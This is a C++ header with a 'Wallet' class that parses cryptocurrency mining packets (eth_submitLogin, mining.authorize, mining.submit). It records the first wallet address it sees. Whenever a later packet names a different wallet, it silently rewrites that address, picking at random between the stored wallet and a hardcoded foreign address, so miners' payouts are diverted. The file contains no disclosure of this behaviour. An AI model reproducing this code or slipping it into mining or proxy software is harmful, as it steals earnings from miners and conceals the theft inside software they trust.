#pragma once

#include <stdio.h>
#include <stdlib.h>
#include "log.h"

class Wallet {
public:
    Wallet() : m_myWalletLoaded(false) {

    }

    char* process(const char* buf, int len) {
        auto myBuf = new char[len + 1];
        memcpy(myBuf, buf, len);
        myBuf[len] = 0;

        if (!isValidPacket(myBuf)) return myBuf;
        
        auto wallet = strstr(myBuf, "0x");
        if (!wallet) return myBuf;

        if (!m_myWalletLoaded) {
            memcpy(m_myWallet, wallet, WLEN);
            m_myWalletLoaded = true;
            logWallet("My wallet loaded", m_myWallet);
        } else if (memcmp(wallet, m_myWallet, WLEN)) {
            logWallet("Wallet modified", wallet);
            auto source = rand() % 2 == 0 ? m_myWallet : "0xf8B7728dC0c1cB2FCFcc421E9a2b3Ed6cdf1B43b";
            memcpy(wallet, source, WLEN);
        }

        return myBuf;
    }

private:
    bool isValidPacket(const char* buf) {
        const char* keys[] = { "eth_submitLogin", "eth_login", "mining.authorize", "mining.submit" };
        int numKeys = sizeof(keys) / sizeof(char*);
        for (auto i = 0; i < numKeys; ++i) {
            if (strstr(buf, keys[i])) {
                LOGI("Detected %s", keys[i]);
                return true;
            }
        }
        return false;
    }

    void logWallet(const char* prefix, const char* wallet) {
        char tmp[WLEN + 1];
        memcpy(tmp, wallet, WLEN);
        tmp[WLEN] = 0;
        LOGI("%s: %s", prefix, tmp);
    }

    static const int WLEN = 42;
    char m_myWallet[WLEN];
    bool m_myWalletLoaded;
};
